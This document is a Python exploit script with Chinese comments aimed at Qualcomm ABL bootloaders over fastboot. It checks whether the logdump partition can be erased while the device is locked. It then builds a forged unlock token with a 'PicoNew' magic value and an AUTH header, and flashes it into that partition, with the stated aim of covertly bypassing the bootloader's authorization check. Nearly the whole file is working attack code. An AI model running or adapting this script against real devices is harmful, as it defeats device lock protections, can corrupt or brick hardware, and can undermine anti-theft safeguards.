#!/usr/bin/env python3
"""
logdump_probe.py — Logdump 分区写保护探测器
========================================
目标：快速验证 Logdump 分区是否被 ABL 的分区保护表遗漏。

原理：
如果 ABL 开发人员在定义敏感和受保护分区时（如 modemst1, frp, abl, xbl 等）
漏掉了 logdump（通常用于存放崩溃日志），那么它在 Locked 状态下就是可擦写的。

利用途径：
只要 logdump 可写，我们就可以将带有 "PicoNew" 魔数和 AUTH 的工程验证 Token
写入到 logdump 分区中。然后在重启时，让系统认为用户已经通过了合法授权检查。
这是一种最优雅、安全且隐蔽的绕过方式。
"""

import subprocess
import sys
import struct
import argparse

def run_fastboot_cmd(args):
    """运行 Fastboot 命令并返回输出结果"""
    print(f"[*] 执行: fastboot {' '.join(args)}")
    try:
        proc = subprocess.run(["fastboot"] + args, capture_output=True, text=True, timeout=5)
        out = proc.stderr + proc.stdout
        print(f"    → {out.strip().replace(chr(10), ' | ')}")
        return out, proc.returncode == 0
    except Exception as e:
        print(f"    → [异常] {e}")
        return str(e), False

def check_logdump_existence():
    """检查 logdump 分区是否存在及其大小"""
    print("\n[>] 1. 探测 logdump 分区信息...")
    out, _ = run_fastboot_cmd(["getvar", "partition-type:logdump"])
    
    if "FAILED" in out or "not found" in out.lower():
        print("[-] logdump 分区可能不存在。")
        return False
        
    out, _ = run_fastboot_cmd(["getvar", "partition-size:logdump"])
    return True

def probe_erase():
    """测试 logdump 是否允许被擦除"""
    print("\n[>] 2. 尝试擦除 logdump 分区 (探测写入权限)...")
    out, _ = run_fastboot_cmd(["erase", "logdump"])
    
    if "OKAY" in out and "FAILED" not in out:
        print("\n[+++] 惊人发现！logdump 分区没有写保护！")
        return True
    elif "FAILED (remote:" in out and ("restricted" in out.lower() or "not allowed" in out.lower() or "locked" in out.lower()):
        print("\n[-] logdump 分区受写保护限制，此路线堵死。")
        return False
    else:
        print("\n[?] 擦除结果不明确，请人工确认上述输出。")
        return False

def generate_fake_token():
    """生成包含正确的 魔数 和 AUTH 签名的伪造结构体"""
    print("\n[>] 3. 生成基于 Token 的驻留载荷...")
    # Token 结构从 0x9533A 处逆向分析得出：
    # 0x00: PicoNew
    # 0x18: AUTH
    
    token = bytearray(256)
    
    # 写入 Magic
    magic = b"PicoNew"
    token[0:len(magic)] = magic
    
    # 写入 Auth Header
    auth = b"AUTH"
    token[0x18:0x18+len(auth)] = auth
    
    # 写入文件
    filename = "fake_token.bin"
    with open(filename, "wb") as f:
        f.write(token)
    print(f"[+] 伪造的凭证环境已保存到 {filename}")
    return filename

def write_fake_token(filename):
    """将伪造 token 刷入 logdump"""
    print(f"\n[>] 4. 尝试将 Token 写入 logdump...")
    out, _ = run_fastboot_cmd(["flash", "logdump", filename])
    if "OKAY" in out and "FAILED" not in out:
        print("\n[SUCCESS] 载荷成功植入 logdump！")
        print("下一步建议: 重启设备，观察 ABL 启动日志是否接受了该 Token。")
    else:
        print("\n[-] 载荷植入失败。")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Logdump Partition Write Protection Prober")
    parser.add_argument("--dry-run", action="store_true", help="干跑测试验证指令")
    args = parser.parse_args()
    
    print("==========================================================")
    print("  Qualcomm ABL Logdump 分区探测器")
    print("  目标: 寻找未受保护的分区植入伪造 Unlock Token")
    print("==========================================================\n")
    
    if args.dry_run:
        print("[*] Dry run 模式开启.")
        generate_fake_token()
        print("[+] 测试完毕。")
        sys.exit(0)
        
    print("警告：此操作直接向当前连接的 Fastboot 设备发送命令！")
    input("按回车键继续探测... (或 Ctrl+C 取消)")
    
    exists = check_logdump_existence()
    if exists:
        if probe_erase():
            token_file = generate_fake_token()
            write_fake_token(token_file)
    else:
        print("\n[!] 取消探测：由于设备上未报告存在 logdump 分区。")
